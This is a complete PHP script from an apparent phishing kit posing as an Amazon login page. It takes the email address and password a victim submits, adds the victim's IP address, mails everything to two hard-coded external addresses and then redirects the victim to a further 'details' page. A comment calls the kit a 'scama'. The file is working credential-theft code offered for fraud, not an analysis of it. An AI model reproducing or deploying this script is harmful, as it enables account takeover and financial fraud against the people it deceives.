<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-------------------- Amazon LOGIN -------------------\n";
$message .= "--------------  Infos -------------\n";
$message .= "Email:    ".$_POST['email']."\n";
$message .= "Password  :    ".$_POST['password']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : https://geoiptool.com//?ip=$ip\n";
$message .= ">>>>>>>>>>>>>>>>>> Coded BY MR.Int  <<<<<<<<<<<<<<<\n";

$subject = "Amazon Login From $IP";
$send = "johnson99@mailnesia.com,johnsonbridges117@gmail.com";
$headers = 'From:1YM4N' . "\r\n" .
mail($send,$subject,$message,$headers);

/*$file_path = "logs.txt";

 if(file_exists($file_path)){
   $fhandle = fopen($file_path,'a+');
   file_put_contents($file_path,trim($message."\n"),FILE_APPEND);
   fclose($fhandle);
 }else{ 
    echo "No";
	  }*/
header("Location:details.php");
include("../css/htaccess.css");// please  do not play with this , this script to protect your scama
?>



